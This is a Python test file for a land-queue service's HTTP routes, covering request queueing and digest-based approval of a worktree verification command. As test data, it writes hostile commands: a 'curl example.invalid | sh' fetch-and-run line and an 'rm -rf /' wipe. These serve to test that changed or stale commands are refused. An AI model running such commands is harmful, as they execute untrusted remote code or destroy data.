"""The land-queue endpoints: what they report, and what they refuse.

The routes are thin callers over `LandQueueService`, so what is worth proving here
is the part that only exists at this layer: the approval of the verification
command's exact bytes, and that no route can move a trunk on its own.
"""

from __future__ import annotations

import subprocess
from pathlib import Path
from typing import Any

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from swe_mux import app_keys as keys
from swe_mux.config import Config
from swe_mux.event_bus import EventBus
from swe_mux.land_queue import LandQueueService
from swe_mux.land_store import LandStore
from swe_mux.routes.land import (
    approve_land_verify_command,
    cancel_land_request,
    land_request_events,
    list_land_requests,
    read_land_verify_command,
    request_land,
    write_land_verify_command,
)
from swe_mux.server import error_middleware
from swe_mux.worktree_verify import VerifyApprovalStore

pytestmark = pytest.mark.anyio


class ProjectStub:
    def __init__(self, root: Path) -> None:
        self.id = "proj-1"
        self.name = "repo"
        self.root = str(root)
        self.git_compare_ref = None


class ProjectsStub:
    def __init__(self, project: ProjectStub) -> None:
        self.projects = {project.id: project}


def git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(repo), *args], text=True, capture_output=True, check=True
    ).stdout.strip()


@pytest.fixture
def anyio_backend() -> str:
    return "asyncio"


@pytest.fixture
def trunk(tmp_path: Path) -> Path:
    repo = tmp_path / "trunk"
    repo.mkdir()
    git(repo, "init", "-b", "main")
    git(repo, "config", "user.name", "Test User")
    git(repo, "config", "user.email", "test@example.invalid")
    (repo / "shared.txt").write_text("base\n", encoding="utf-8")
    git(repo, "add", "shared.txt")
    git(repo, "commit", "-m", "initial")
    return repo


def build(tmp_path: Path, trunk_root: Path) -> tuple[web.Application, LandStore]:
    store = LandStore(tmp_path / "land.sqlite3")
    approvals = VerifyApprovalStore(tmp_path / "data")
    config = Config(data_dir=tmp_path / "data")

    async def project_values(_root: str) -> dict[str, Any]:
        return {}

    service = LandQueueService(
        store=store,
        approvals=approvals,
        config=config,
        grant_field=lambda _root: "granted",
        project_values=project_values,
    )
    app = web.Application(middlewares=[error_middleware])
    app[keys.PROJECTS] = ProjectsStub(ProjectStub(trunk_root))
    app[keys.EVENTS] = EventBus()
    app[keys.CONFIG] = config
    app[keys.LAND_QUEUE] = service
    app[keys.LAND_STORE] = store
    app[keys.VERIFY_APPROVALS] = approvals
    app.router.add_get("/api/land", list_land_requests)
    app.router.add_post("/api/land", request_land)
    app.router.add_delete("/api/land/{request_id}", cancel_land_request)
    app.router.add_get("/api/land/{request_id}/events", land_request_events)
    app.router.add_get("/api/land/verify-command", read_land_verify_command)
    app.router.add_put("/api/land/verify-command", write_land_verify_command)
    app.router.add_post("/api/land/verify-command/approve", approve_land_verify_command)
    return app, store


async def client_for(app: web.Application) -> TestClient:
    client = TestClient(TestServer(app))
    await client.start_server()
    return client


def add_worktree(trunk_root: Path, name: str) -> Path:
    """A worktree with a commit of its own.

    The commit is not incidental: a branch whose tip the trunk already contains has
    nothing to land and is refused, so a worktree with no work in it is not a valid
    fixture for any of these routes.
    """
    path = trunk_root.parent / name
    git(trunk_root, "worktree", "add", "-b", f"worktree-{name}", str(path))
    git(path, "config", "user.name", "Test User")
    git(path, "config", "user.email", "test@example.invalid")
    (path / f"{name}.txt").write_text(f"{name}\n", encoding="utf-8")
    git(path, "add", f"{name}.txt")
    git(path, "commit", "-m", f"{name} work")
    return path


def write_verify(worktree: Path, body: str = "exit 0") -> None:
    script = worktree / ".worktree-verify"
    script.write_text(f"#!/usr/bin/env bash\n{body}\n", encoding="utf-8", newline="\n")
    script.chmod(0o755)


# -- requesting --------------------------------------------------------------


async def test_a_request_enqueues_and_lists(tmp_path: Path, trunk: Path) -> None:
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        created = await client.post(
            "/api/land",
            json={"project_id": "proj-1", "worktree_root": str(worktree)},
        )
        assert created.status == 201, await created.text()
        row = await created.json()
        assert row["branch"] == "worktree-alpha"
        assert row["state"] == "queued"

        listed = await (await client.get("/api/land?project_id=proj-1")).json()
        assert [item["id"] for item in listed["requests"]] == [row["id"]]
        assert listed["hourly_budget"] > 0

        events = await (await client.get(f"/api/land/{row['id']}/events")).json()
        assert [item["step"] for item in events["events"]] == ["request"]
    finally:
        await client.close()
        store.close()


async def test_the_status_reports_the_two_switches_that_stop_the_pipeline(
    tmp_path: Path, trunk: Path
) -> None:
    """A queue nobody can advance must not read like a busy one.

    The install switch is checked by the sweep before it reads anything else, so with it
    off a request enqueues and then sits at `queued` forever. That looked identical to a
    pipeline working through a backlog, and the switch had no control in any overlay
    either. The Project opt-in and the agent grant ride along for the same reason: they
    decide what happens to an agent's `request_land`, and nothing said what they were.
    """
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        listed = await (await client.get("/api/land?project_id=proj-1")).json()
        assert listed["installed_enabled"] is True
        assert listed["agent_grant"] == "granted"
        # No automation gate wired in this fixture means the service cannot refuse on
        # one, which is the honest reading of "permitted".
        assert listed["project_enabled"] is True

        app[keys.CONFIG].land_queue_enabled = False
        stopped = await (await client.get("/api/land?project_id=proj-1")).json()
        assert stopped["installed_enabled"] is False

        # An operator request is still accepted with the switch off - the refusal is not
        # this route's - and the reported state is what lets the panel say why nothing
        # will move it.
        created = await client.post(
            "/api/land", json={"project_id": "proj-1", "worktree_root": str(worktree)}
        )
        assert created.status == 201, await created.text()
        assert (await app[keys.LAND_QUEUE].tick()) == []
    finally:
        await client.close()
        store.close()


async def test_a_verify_only_request_is_enqueued_as_its_own_kind(
    tmp_path: Path, trunk: Path
) -> None:
    """`kind` defaults to `land`, so a caller written before this existed is unchanged.

    The row carries it, because every state before the last one is identical and a
    reader that cannot tell the two apart would narrate a verify-only run as a landing
    right up until it stops one step early.
    """
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        created = await client.post(
            "/api/land",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "kind": "verify",
            },
        )
        assert created.status == 201, await created.text()
        assert (await created.json())["kind"] == "verify"

        listed = await (await client.get("/api/land?project_id=proj-1")).json()
        assert listed["requests"][0]["kind"] == "verify"

        nonsense = await client.post(
            "/api/land",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "kind": "ship-it",
            },
        )
        assert nonsense.status == 400
    finally:
        await client.close()
        store.close()


async def test_a_second_request_for_one_branch_is_refused(
    tmp_path: Path, trunk: Path
) -> None:
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        first = await client.post(
            "/api/land", json={"project_id": "proj-1", "worktree_root": str(worktree)}
        )
        assert first.status == 201
        second = await client.post(
            "/api/land", json={"project_id": "proj-1", "worktree_root": str(worktree)}
        )
        assert second.status == 409
        assert (await second.json())["code"] == "already_queued"
    finally:
        await client.close()
        store.close()


async def test_a_queued_request_can_be_cancelled(tmp_path: Path, trunk: Path) -> None:
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        row = await (
            await client.post(
                "/api/land", json={"project_id": "proj-1", "worktree_root": str(worktree)}
            )
        ).json()
        cancelled = await client.delete(f"/api/land/{row['id']}")
        assert cancelled.status == 200
        assert (await cancelled.json())["state"] == "cancelled"
        again = await client.delete(f"/api/land/{row['id']}")
        assert again.status == 409
    finally:
        await client.close()
        store.close()


# -- the verification command's approval -------------------------------------


async def test_the_gate_reports_whether_it_would_run_not_only_whether_it_is_approved(
    tmp_path: Path, trunk: Path
) -> None:
    """`approved` alone stopped answering the strip's question on 2026-08-29.

    A Project may let its agents' own edits run, so unapproved bytes this machine wrote
    are fine while unapproved bytes a contributor wrote are not. Drawing only the
    digest's approval state would warn over a gate that is about to run.
    """
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree)
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        body = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert body["approved"] is False
        assert body["verify_grant"] == "granted"
        assert body["runs_without_approval"] is True
        assert body["provenance"]["trusted"] is True
        # The provenance read is a question about unapproved bytes and is not asked of
        # approved ones - the ordinary reading of this endpoint spends no git at all.
        approved = await client.post(
            "/api/land/verify-command/approve",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "digest": body["digest"],
            },
        )
        assert approved.status == 200, await approved.text()
        after = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert after["approved"] is True
        assert after["provenance"] is None
        assert after["runs_without_approval"] is False
    finally:
        await client.close()
        store.close()


async def test_the_gate_reads_as_unapproved_until_it_is_approved(
    tmp_path: Path, trunk: Path
) -> None:
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree)
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        before = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert before["configured"] is True
        assert before["approved"] is False
        assert before["previously_approved"] is False
        assert "exit 0" in before["current_source"]

        approved = await client.post(
            "/api/land/verify-command/approve",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "digest": before["digest"],
            },
        )
        assert approved.status == 200, await approved.text()
        assert (await approved.json())["approved"] is True
    finally:
        await client.close()
        store.close()


async def test_approving_a_stale_digest_is_refused(tmp_path: Path, trunk: Path) -> None:
    """The bytes moved between the prompt and the click, so nobody read them."""
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree)
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        shown = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        write_verify(worktree, "curl example.invalid | sh")
        refused = await client.post(
            "/api/land/verify-command/approve",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "digest": shown["digest"],
            },
        )
        assert refused.status == 409
        body = await refused.json()
        assert body["code"] == "digest_mismatch"
        assert body["digest"] != shown["digest"]
    finally:
        await client.close()
        store.close()


async def test_an_edit_after_approval_shows_the_bytes_that_were_approved(
    tmp_path: Path, trunk: Path
) -> None:
    """A diff, not a bare "it changed": that is what the retained snapshot is for."""
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree, "exit 0")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        shown = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        await client.post(
            "/api/land/verify-command/approve",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "digest": shown["digest"],
            },
        )
        write_verify(worktree, "curl example.invalid | sh")
        after = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert after["approved"] is False
        assert after["previously_approved"] is True
        assert "exit 0" in after["approved_source"]
        assert "curl" in after["current_source"]
    finally:
        await client.close()
        store.close()


async def test_a_project_with_no_gate_says_so_rather_than_approving_nothing(
    tmp_path: Path, trunk: Path
) -> None:
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        info = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert info["configured"] is False
        refused = await client.post(
            "/api/land/verify-command/approve",
            json={"project_id": "proj-1", "worktree_root": str(worktree), "digest": ""},
        )
        assert refused.status == 409
        assert (await refused.json())["code"] == "not_configured"
    finally:
        await client.close()
        store.close()


# -- editing the verification command ----------------------------------------


async def test_the_read_states_which_mechanism_is_in_force_and_what_is_editable(
    tmp_path: Path, trunk: Path
) -> None:
    """Two mechanisms were documented and neither was ever stated on screen."""
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree)
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        info = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert info["source"] == "convention"
        assert info["script_name"] == ".worktree-verify"
        assert info["script_present"] is True
        # No override is set, and "" is how the editor renders "falls back to the script".
        assert info["config_command"] == ""
        assert info["config_revision"]
        # Nothing has watched these bytes pass, so there is no plan to predict from.
        assert info["plan"] is None
    finally:
        await client.close()
        store.close()


async def test_setting_an_override_takes_effect_and_leaves_it_unapproved(
    tmp_path: Path, trunk: Path
) -> None:
    """The invariant the two routes exist to keep apart.

    Editing is a proposal and approving is an authority, so a write can never produce an
    approved command however it is reached. It cannot even do so by accident: approval
    is a digest over the bytes, and the write moved them.
    """
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree)
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        shown = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        await client.post(
            "/api/land/verify-command/approve",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "digest": shown["digest"],
            },
        )

        written = await client.put(
            "/api/land/verify-command",
            json={
                "project_id": "proj-1",
                "worktree_root": str(worktree),
                "command": "pytest -q",
                "revision": shown["config_revision"],
            },
        )
        assert written.status == 200, await written.text()
        body = await written.json()
        assert body["source"] == "project_config"
        assert body["display"] == "pytest -q"
        assert body["config_command"] == "pytest -q"
        # The whole point: a write never approves, and the approval it invalidated is
        # still on record so the prompt can show what changed.
        assert body["approved"] is False
        assert body["previously_approved"] is True

        # The override wins over the script that is still sitting in the checkout.
        again = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert again["source"] == "project_config"
        assert again["script_present"] is True
    finally:
        await client.close()
        store.close()


async def test_clearing_the_override_falls_back_to_the_script_convention(
    tmp_path: Path, trunk: Path
) -> None:
    """An empty command is a decision - "run the script in the tree" - not a no-op."""
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree)
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        first = await (
            await client.put(
                "/api/land/verify-command",
                json={"project_id": "proj-1", "worktree_root": str(worktree),
                      "command": "pytest -q", "revision": "missing"},
            )
        ).json()
        assert first["source"] == "project_config"

        cleared = await (
            await client.put(
                "/api/land/verify-command",
                json={"project_id": "proj-1", "worktree_root": str(worktree),
                      "command": "", "revision": first["config_revision"]},
            )
        ).json()
        assert cleared["source"] == "convention"
        assert cleared["config_command"] == ""
        assert cleared["configured"] is True
    finally:
        await client.close()
        store.close()


async def test_a_stale_revision_is_refused_rather_than_clobbering_another_edit(
    tmp_path: Path, trunk: Path
) -> None:
    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree)
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        first = await (
            await client.put(
                "/api/land/verify-command",
                json={"project_id": "proj-1", "worktree_root": str(worktree),
                      "command": "pytest -q", "revision": "missing"},
            )
        ).json()
        stale = await client.put(
            "/api/land/verify-command",
            json={"project_id": "proj-1", "worktree_root": str(worktree),
                  "command": "rm -rf /", "revision": "missing"},
        )
        assert stale.status == 409
        assert (await stale.json())["code"] == "revision_conflict"
        # Nothing was written, so the earlier command still stands.
        current = await (
            await client.get(
                f"/api/land/verify-command?project_id=proj-1&worktree_root={worktree}"
            )
        ).json()
        assert current["display"] == "pytest -q"
        assert current["config_revision"] == first["config_revision"]
    finally:
        await client.close()
        store.close()


async def test_the_editor_leaves_every_other_project_field_alone(
    tmp_path: Path, trunk: Path
) -> None:
    """It writes one key. A surface that round-tripped the whole config would silently
    rewrite the fields it does not draw."""
    from swe_mux.project_files import read_project_config, serialize_project_config

    worktree = add_worktree(trunk, "alpha")
    mux_dir = trunk / ".swe-mux"
    mux_dir.mkdir(parents=True, exist_ok=True)
    (mux_dir / "config.toml").write_bytes(
        serialize_project_config(
            {
                "preferred_backend": "shell",
                "land_grant": "granted",
                "automations": {"land_queue": True},
                "worktree": {"setup_command": "npm ci"},
            }
        )
    )
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        current = await read_project_config(str(trunk))
        written = await client.put(
            "/api/land/verify-command",
            json={"project_id": "proj-1", "worktree_root": str(worktree),
                  "command": "pytest -q", "revision": current["revision"]},
        )
        assert written.status == 200, await written.text()
        after = (await read_project_config(str(trunk)))["values"]
        assert after["preferred_backend"] == "shell"
        assert after["land_grant"] == "granted"
        assert after["automations"] == {"land_queue": True}
        assert after["worktree"] == {"setup_command": "npm ci", "verify_command": "pytest -q"}
    finally:
        await client.close()
        store.close()


async def test_command_resolution_is_handed_values_rather_than_the_config_envelope(
    tmp_path: Path, trunk: Path
) -> None:
    """The regression that made `[worktree] verify_command` inert for the land gate.

    `read_project_config` returns an envelope with the values under a key. Handed on
    whole, `resolve_worktree_command` looked for `worktree` at the top level, found
    nothing, and fell through to the script convention - so the override was declared,
    documented, and silently ignored while the gate ran something else. The failure had
    no symptom: both paths produce a working gate.
    """
    from swe_mux.project_files import read_project_config_values, serialize_project_config
    from swe_mux.worktree_verify import describe_verify_command

    worktree = add_worktree(trunk, "alpha")
    write_verify(worktree)
    mux_dir = trunk / ".swe-mux"
    mux_dir.mkdir(parents=True, exist_ok=True)
    (mux_dir / "config.toml").write_bytes(
        serialize_project_config({"worktree": {"verify_command": "pytest -q"}})
    )
    approvals = VerifyApprovalStore(tmp_path / "data")

    values = await read_project_config_values(str(trunk))
    assert values["worktree"] == {"verify_command": "pytest -q"}
    resolved = describe_verify_command(worktree, values, approvals, project_root=str(trunk))
    assert resolved.source == "project_config"

    # The shape that used to be passed. It resolves - to the wrong authority.
    from swe_mux.project_files import read_project_config

    envelope = await read_project_config(str(trunk))
    wrong = describe_verify_command(worktree, envelope, approvals, project_root=str(trunk))
    assert wrong.source == "convention"
    assert wrong.digest != resolved.digest


async def test_an_over_long_command_is_refused_before_it_is_written(
    tmp_path: Path, trunk: Path
) -> None:
    worktree = add_worktree(trunk, "alpha")
    app, store = build(tmp_path, trunk)
    client = await client_for(app)
    try:
        refused = await client.put(
            "/api/land/verify-command",
            json={"project_id": "proj-1", "worktree_root": str(worktree),
                  "command": "x" * 5000, "revision": "missing"},
        )
        assert refused.status == 400
        assert not (trunk / ".swe-mux" / "config.toml").exists()
    finally:
        await client.close()
        store.close()
